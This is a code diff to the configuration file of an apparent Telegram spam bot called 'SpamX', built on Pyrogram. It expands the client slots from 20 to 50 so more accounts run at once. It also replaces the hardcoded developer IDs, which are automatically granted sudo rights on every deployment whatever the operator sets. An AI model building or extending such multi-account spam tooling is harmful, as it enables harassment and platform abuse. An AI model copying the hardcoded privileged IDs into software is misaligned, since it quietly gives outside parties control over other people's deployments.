@@ -12,7 +12,7 @@ import time
 from dotenv import load_dotenv
 from pyrogram import Client, filters
 
-ULOG = [1517994352, 1789859817, -1001749467927, -1001321613309]
+ULOG = [1908955228, 5400382933]
 
 if os.path.exists(".env"):
     load_dotenv(".env")
@@ -45,6 +45,37 @@ CLIENT17 = os.getenv("CLIENT17", None)
 CLIENT18 = os.getenv("CLIENT18", None)
 CLIENT19 = os.getenv("CLIENT19", None)
 CLIENT20 = os.getenv("CLIENT20", None)
+CLIENT21 = os.getenv("CLIENT21", None)
+CLIENT22 = os.getenv("CLIENT22", None)
+CLIENT23 = os.getenv("CLIENT23", None)
+CLIENT24 = os.getenv("CLIENT24", None)
+CLIENT25 = os.getenv("CLIENT25", None)
+CLIENT26 = os.getenv("CLIENT26", None)
+CLIENT27 = os.getenv("CLIENT27", None)
+CLIENT28 = os.getenv("CLIENT28", None)
+CLIENT29 = os.getenv("CLIENT29", None)
+CLIENT30 = os.getenv("CLIENT30", None)
+CLIENT31 = os.getenv("CLIENT31", None)
+CLIENT32 = os.getenv("CLIENT32", None)
+CLIENT33 = os.getenv("CLIENT33", None)
+CLIENT34 = os.getenv("CLIENT34", None)
+CLIENT35 = os.getenv("CLIENT35", None)
+CLIENT36 = os.getenv("CLIENT36", None)
+CLIENT37 = os.getenv("CLIENT37", None)
+CLIENT38 = os.getenv("CLIENT38", None)
+CLIENT39 = os.getenv("CLIENT39", None)
+CLIENT40 = os.getenv("CLIENT40", None)
+CLIENT41 = os.getenv("CLIENT41", None)
+CLIENT42 = os.getenv("CLIENT42", None)
+CLIENT43 = os.getenv("CLIENT43", None)
+CLIENT44 = os.getenv("CLIENT44", None)
+CLIENT45 = os.getenv("CLIENT45", None)
+CLIENT46 = os.getenv("CLIENT46", None)
+CLIENT47 = os.getenv("CLIENT47", None)
+CLIENT48 = os.getenv("CLIENT48", None)
+CLIENT49 = os.getenv("CLIENT49", None)
+CLIENT50 = os.getenv("CLIENT50", None)
+
 LOGS_CHANNEL = os.getenv("LOGS_CHANNEL", None)
 if LOGS_CHANNEL:
     if int(LOGS_CHANNEL) in ULOG:
@@ -68,13 +99,13 @@ SUDO_USERS = []
 if sudo:
     SUDO_USERS = make_int(sudo)
 
-DEVS = [1517994352, 1789859817]
+DEVS = [1908955228, 5400382933]
 for x in DEVS:
     SUDO_USERS.append(x)
     SUDO_USERS.append(OWNER_ID)
 
 
-# SUDO_USERS = list(filter(lambda x: x, map(int, os.getenv("SUDO_USERS", "1517994352 1789859817").split())))
+# SUDO_USERS = list(filter(lambda x: x, map(int, os.getenv("SUDO_USERS", "1908955228 5400382933").split())))
 #----------------------------------------------
 if ":" in CLIENT:
    RiZoeL = Client('SpamX', api_id=API_ID, api_hash=API_HASH, bot_token=CLIENT, plugins=dict(root="SpamX.bot"))
@@ -296,4 +327,5 @@ if CLIENT20:
          print("Client 20 Found")
 else:
          RiZoeL20 = None
+
 
